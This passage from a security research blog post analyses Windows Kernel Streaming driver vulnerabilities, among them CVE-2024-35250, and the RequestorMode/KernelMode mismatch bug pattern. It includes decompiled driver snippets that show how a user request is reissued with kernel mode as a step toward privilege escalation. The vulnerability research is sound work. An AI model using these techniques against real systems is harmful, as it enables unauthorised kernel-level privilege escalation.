&lt;p&gt;After reviewing Kernel Streaming from the above perspectives, we quickly identified several relatively easy-to-discover vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;portcls.sys
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38055 (out-of-bounds read when set dataformat for Pin)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38056&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ksthunk
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38054 (out-of-bounds write)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38057&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, we will not be explaining these vulnerabilities one by one. Most of these are obvious issues such as unchecked length or index leading to out-of-bounds access.  &lt;a href=&quot;https://x.com/Fr0st1706&quot;&gt;@Fr0st1706&lt;/a&gt; also wrote an &lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;exploit for CVE-2024-38054&lt;/a&gt; recently. We might slowly explain these in subsequent parts in the future. We will leave this for the readers to study for now.&lt;/p&gt;

&lt;p&gt;During the review process, we discovered some interesting things. Do you think the following code snippet is really fine?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(__int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{

    if ( irp-&amp;gt;RequestorMode )
    {
        v14 = 0xC0000010;
    }
    else
    {
        UserBuffer = (unsigned int *)irp-&amp;gt;UserBuffer;
        ...
        v14 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64 *))    (Type3InputBuffer + 0x38))(// call Type3InputBuffer+0x38
                *UserBuffer,
                0LL,
               v19);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seeing this code reminds me of &lt;a href=&quot;https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/&quot;&gt;CVE-2024-21338&lt;/a&gt;. Initially, the vulnerability had no checks, but after patching, &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-exgetpreviousmode&quot;&gt;ExGetPreviousMode&lt;/a&gt; was added. However, the check here uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; in &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp&quot;&gt;IRP&lt;/a&gt; for validation. Generally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; from a user-called IOCTL will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt;, so there shouldn’t be any issues.&lt;/p&gt;

&lt;p&gt;At this point, I also recall &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt;’s article &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;the-overlooked-bug-class&quot;&gt;The overlooked bug class&lt;/h2&gt;
&lt;p&gt;First, we need to mention a few terms and concepts. If you are already familiar with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Previous Mode&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;, you can skip to &lt;a href=&quot;#A-logical-bug-class&quot;&gt;A logical bug class&lt;/a&gt; section.&lt;/p&gt;

&lt;h3 id=&quot;previousmode&quot;&gt;PreviousMode&lt;/h3&gt;
&lt;p&gt;The first one is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;. In an Application, if a user operates on a device or file through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nt*&lt;/code&gt; System Service Call, upon entering the kernel, it will be marked as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt; in &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/kernel/eprocess#ethread&quot;&gt;_ETHREAD&lt;/a&gt;’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;, indicating that this System Service Call is from the user. Conversely, if it is called from kernel mode, such as a device driver invoking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zw*&lt;/code&gt; System Service Call, it will be marked as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;requestormode&quot;&gt;RequestorMode&lt;/h3&gt;
&lt;p&gt;Another similar field is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; in the IRP. This field records whether your original request came from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;. In kernel driver code, this is a very commonly used field, typically derived from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It is often used to decide whether to perform additional checks on user requests, such as Memory Access Check or Security Access Check. In the example below, if the request comes from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode&lt;/code&gt;, it will check the user-provided address. If it comes from the Kernel, no additional checks are performed to increase efficiency.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But in reality, this has also led to some issues.&lt;/p&gt;

&lt;h3 id=&quot;a-logical-bug-class&quot;&gt;A logical bug class&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt;’s &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; mentions a type of Bug Class.&lt;/p&gt;

&lt;p&gt;What would happen if a user calls a System Service Call like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtDeviceIoControlFile&lt;/code&gt;, and then the driver handling it uses user-controllable data as parameters for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwOpenFile&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the driver calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwOpenFile&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt; will switch to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;, and when it uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt; processing, most checks will be skipped due to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt; being &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;. Subsequently, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; will become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;,  bypassing the Security Access Check and Memory Access Check. However, this largely depends on how the subsequent driver implements these checks. There might be issues if it relies solely on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; to decide whether to perform checks The actual situation is slightly more complex and related to the flags of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile&lt;/code&gt;. For details, refer to the following articles:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local privilege escalation via the Windows I/O Manager: a variant finding collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These studies mainly focused on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zw*&lt;/code&gt; series of System Service Call. Are there other similar situations that could also cause this kind of logical vulnerability?&lt;/p&gt;

&lt;h4 id=&quot;the-new-bug-pattern&quot;&gt;The new bug pattern&lt;/h4&gt;
&lt;p&gt;Actually, it is possible. When the device driver uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt; to create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; IRP, it is easy to encounter such issues if not careful. This API is primarily used by kernel drivers to call IOCTL, and it helps you build the IRP. Subsequently, calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IofCallDriver&lt;/code&gt; allows you to call IOCTL within the kernel driver. On &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest#remarks&quot;&gt;Microsoft Learn&lt;/a&gt;, there is a particular passage worth noting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By default, if you do not explicitly set the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;&lt;/strong&gt;, it will directly call IOCTL with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Following this approach, we revisited Kernel Streaming and discovered an intriguing aspect.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The function where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoBuildDeviceIoControlRequest&lt;/code&gt; is used in Kernel Streaming is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; and it obviously involves calling IOCTL in the kernel using the aforementioned method. However, it appears that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; is properly set here, and different values are assigned based on the parameters of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt;. This will be a convenient library for kernel streaming driver developers.&lt;/p&gt;

&lt;p&gt;However…&lt;/p&gt;

&lt;p&gt;ks!CKsPin::GetState
&lt;img src=&quot;/assets/img/blog/20240823/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!SerializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!UnserializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found that in Kernel Streaming, all functions using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; consistently use &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;&lt;/strong&gt;. At this point, we can carefully inspect whether the places it is used have any security issues. Therefore, we convert the bug pattern in Kernel Streaming into the following points:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Utilized &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Controllable InputBuffer &amp;amp; OutputBuffer&lt;/li&gt;
  &lt;li&gt;The second processing of IOCTL relies on &lt;strong&gt;RequestorMode&lt;/strong&gt; for security checks
 &lt;img src=&quot;/assets/img/blog/20240823/21.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Following this pattern, we quickly found the first vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;the-vulnerability--exploitation&quot;&gt;The vulnerability &amp;amp; exploitation&lt;/h2&gt;

&lt;h3 id=&quot;cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/h3&gt;

&lt;p&gt;This vulnerability is also the one we used in &lt;a href=&quot;https://x.com/thezdi/status/1770517322203070674&quot;&gt;Pwn2Own Vancouver 2024&lt;/a&gt;. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; of Kernel Streaming, to increase efficiency, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_SERIALIZESET&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; requests are provided to allow users to operate on multiple properties through a single call.  These types of requests will be broken down into multiple calls by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsPropertyHandler&lt;/code&gt;. For more details, refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure#remarks&quot;&gt;this one&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It is implemented in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When handling property in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;, if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; flag is provided, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!UnserializePropertySet&lt;/code&gt; will handle your request.&lt;/p&gt;

&lt;p&gt;Let’s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnserializePropertySet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PIRP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSIDENTIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserProvideProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSPROPERTY_SET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;propertyset_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExAllocatePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NonPagedPoolNx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7070534Bu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[1] &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsSynchronousIoControlDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that during the processing, the original request is first copied into a newly allocated buffer at [1]. Subsequently, this buffer is used to call the new IOCTL using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; at [2]. Both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;New_KsProperty_req&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; are contents provided by the user.&lt;/p&gt;

&lt;p&gt;The flow when calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; is roughly as illustrated below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When calling IOCTL, as shown in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;step 2&lt;/code&gt; of the diagram, the I/O Manager will set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt;. Until step 6, it will check if the requested property by the user exists in the KS object. If the property exists in the KS object and is set with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt;,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; will be used to handle the specified property.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, in step 7, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; will be used to perform the IOCTL again. At this point, the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; will become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;, and the subsequent processing will be the same as a typical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt;. This part will not be elaborated further.&lt;/p&gt;

&lt;p&gt;As a result, we now have a primitive that allows us to perform arbitrary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; operations. Next, we need to look for places where it might be possible to achieve EoP (Elevation of Privilege).&lt;/p&gt;

&lt;h3 id=&quot;the-eop&quot;&gt;The EoP&lt;/h3&gt;
&lt;p&gt;The first thing you will likely notice is the entry point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSThunkDevice::DispatchIoctl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DispatchIoctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CKernelFilterDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoIs32bitProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;//Convert 32-bit requests to 64-bit requests&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_KS_PROPERTY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----[4];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; will first determine whether the request is from a WoW64 Process. If it is, it will convert the original 32-bit Requests into 64-bit at [3]. If the original request is already 64-bit, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSThunkDevice::CheckIrpForStackAdjustmentNative&lt;/code&gt; at [4] to pass it down.&lt;/p&gt;

